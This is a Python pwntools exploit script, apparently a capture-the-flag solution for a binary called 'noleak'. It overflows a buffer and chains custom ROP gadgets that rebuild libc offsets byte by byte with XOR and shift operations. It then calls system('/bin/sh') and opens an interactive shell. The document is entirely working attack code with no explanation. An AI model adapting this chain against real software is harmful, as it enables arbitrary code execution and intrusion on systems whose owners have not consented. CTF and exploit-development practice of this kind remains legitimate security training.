from pwn import *

elf = ELF('./noleak')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process('./noleak')

call_rax = p64(0x0000000000401014)
ret = p64(0x000000000040101a)

_ = elf.symbols['_']
g1 = p64(_+8)	# rax <- any(stack)
g2 = p64(_+10)	# rdi <- rax
g3 = p64(_+14)	# rbx <- 0; r11 <- rax
g4 = p64(_+21)	# rax <- r11
g5 = p64(_+25)	# r10b <- ah ^ bh
g6 = p64(_+38)	# bl <- r10b
g7 = p64(_+44)	# rbx <- rbx << 8
g8 = p64(_+49)	# rax <- rax + rbx	

rax_libc_off = 0x29d90
bin_sh_off = next(libc.search(b'/bin/sh\x00')) - rax_libc_off
system_off = libc.symbols['system'] - rax_libc_off

print(f"bin_sh_off  0x{bin_sh_off:x}")

print(f"system_off  0x{system_off:x}")

def S(offset):
	ropchain = b""
	byte_length = (len(hex(offset))-1)//2  # <- this gets the number of non-zero bytes of offset
	off = offset.to_bytes(byte_length, 'big')
	x_ant = 0
	for i in range(byte_length):
		x_act = off[i]^x_ant
		x_ant = off[i]
		ropchain += g1 + p64(x_act<<8)
		ropchain += g5
		ropchain += g6
		if i < byte_length-1:
			ropchain += g7

	return ropchain 

payload = g3 + S(bin_sh_off) + g4 + g8 + g2 + g4
payload += g3 + S(system_off) + g4 + g8 + call_rax

io.sendline(b"A"*18+payload)
io.interactive()
